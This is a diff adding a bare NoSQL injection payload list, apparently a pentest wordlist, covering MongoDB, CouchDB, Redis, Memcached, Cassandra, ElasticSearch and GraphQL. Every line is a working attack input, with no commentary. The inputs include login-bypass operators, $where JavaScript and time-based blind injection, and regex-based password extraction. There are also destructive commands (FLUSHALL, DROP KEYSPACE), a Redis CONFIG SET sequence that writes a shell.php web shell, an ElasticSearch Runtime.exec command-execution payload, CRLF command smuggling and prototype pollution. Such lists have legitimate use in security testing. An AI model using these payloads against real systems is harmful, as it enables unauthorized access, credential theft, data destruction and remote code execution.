@@ -1,0 +1,148 @@
+# NoSQL Injection Payloads
+# For MongoDB, CouchDB, Redis, and other NoSQL databases
+
+# MongoDB - Basic operators
+{"$gt": ""}
+{"$gt": 0}
+{"$ne": ""}
+{"$ne": null}
+{"$ne": 1}
+{"$nin": []}
+{"$exists": true}
+{"$regex": ".*"}
+{"$regex": "^"}
+{"$lt": 9999999999}
+{"$gte": 0}
+{"$where": "1==1"}
+{"$or": [{"a": 1}, {"b": 2}]}
+{"$and": [{"a": 1}, {"b": 2}]}
+
+# MongoDB - Authentication bypass
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+{"username": {"$exists": true}, "password": {"$exists": true}}
+{"username": "admin", "password": {"$gt": ""}}
+{"username": "admin", "password": {"$ne": ""}}
+{"username": "admin", "password": {"$regex": ".*"}}
+{"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$gt": ""}}
+
+# MongoDB - $where JavaScript injection
+{"$where": "this.username == 'admin'"}
+{"$where": "1==1"}
+{"$where": "function() { return true; }"}
+{"$where": "this.password.length > 0"}
+{"$where": "this.password.match(/.*/)"}
+{"$where": "sleep(5000)"}
+{"$where": "this.constructor.constructor('return this')().sleep(5000)"}
+
+# MongoDB - URL parameter syntax
+username[$gt]=
+username[$ne]=
+password[$gt]=
+password[$ne]=
+username[$regex]=.*
+password[$regex]=.*
+username[$exists]=true
+password[$exists]=true
+$where=1==1
+$or[0][username]=admin&$or[1][username]=user
+
+# MongoDB - Time-based blind injection
+{"$where": "sleep(5000) || true"}
+{"$where": "(function(){var a=new Date();while(new Date()-a<5000){}return true;})()"}
+{"$where": "this.password.length==5 && sleep(5000)"}
+
+# MongoDB - Data extraction regex
+{"username": "admin", "password": {"$regex": "^a"}}
+{"username": "admin", "password": {"$regex": "^b"}}
+{"username": "admin", "password": {"$regex": "^admin"}}
+{"password": {"$regex": "^.{1,5}$"}}
+{"password": {"$regex": "^[a-zA-Z0-9]{8}$"}}
+
+# MongoDB - Object injection
+{username: {$gt: ""}}
+{username: {$type: 2}}
+{username: {$size: 0}}
+{$comment: "test"}
+
+# CouchDB injection
+{"selector": {"_id": {"$gt": null}}}
+{"selector": {"username": {"$regex": ".*"}}}
+{"selector": {"$or": [{"username": "admin"}, {"password": {"$gt": ""}}]}}
+
+# Redis injection
+SET key value
+GET key
+KEYS *
+CONFIG GET *
+CONFIG SET dir /var/www/html
+CONFIG SET dbfilename shell.php
+SAVE
+FLUSHALL
+INFO
+CLIENT LIST
+DEBUG SLEEP 5
+EVAL "return redis.call('get','key')" 0
+
+# Redis command injection via CRLF
+\r\nSET test test\r\n
+%0d%0aSET%20test%20test%0d%0a
+\r\n$3\r\nSET\r\n$4\r\ntest\r\n$4\r\ntest\r\n
+
+# Memcached injection
+stats
+stats slabs
+get key
+set key 0 60 4\r\ntest
+delete key
+flush_all
+
+# Cassandra CQL injection
+' OR 'x'='x
+' OR ''='
+'; DROP KEYSPACE test; --
+'; SELECT * FROM users WHERE username='admin' ALLOW FILTERING; --
+
+# ElasticSearch injection
+{"query": {"match_all": {}}}
+{"query": {"bool": {"must": [{"match": {"_all": "*"}}]}}}
+{"script_fields": {"test": {"script": "java.lang.Runtime.getRuntime().exec('id')"}}}
+{"query": {"query_string": {"query": "*:*"}}}
+
+# GraphQL injection (related)
+{"query": "{ __schema { types { name } } }"}
+{"query": "{ __type(name: \"User\") { fields { name } } }"}
+{"query": "mutation { deleteUser(id: \"*\") }"}
+
+# LDAP injection style for NoSQL
+*)(uid=*))(|(uid=*
+*()|&
+*()|%00
+
+# Array injection
+username[]=admin&password[]=anything
+username[$eq]=admin&password[$ne]=
+user[0]=admin&pass[0][$gt]=
+
+# Null injection
+{"username": null, "password": {"$ne": null}}
+{"username": {"$type": 10}}
+
+# Type confusion
+{"username": true}
+{"username": 1}
+{"username": []}
+{"username": {}}
+
+# Prototype pollution (MongoDB/Node.js)
+{"__proto__": {"admin": true}}
+{"constructor": {"prototype": {"admin": true}}}
+
+# MongoDB mapReduce injection
+{"$where": "function() { emit(this.username, this.password); return false; }"}
+
+# Aggregation pipeline injection
+{"$lookup": {"from": "users", "localField": "x", "foreignField": "x", "as": "leaked"}}
+{"$unionWith": {"coll": "users"}}
+{"$out": "pwned"}
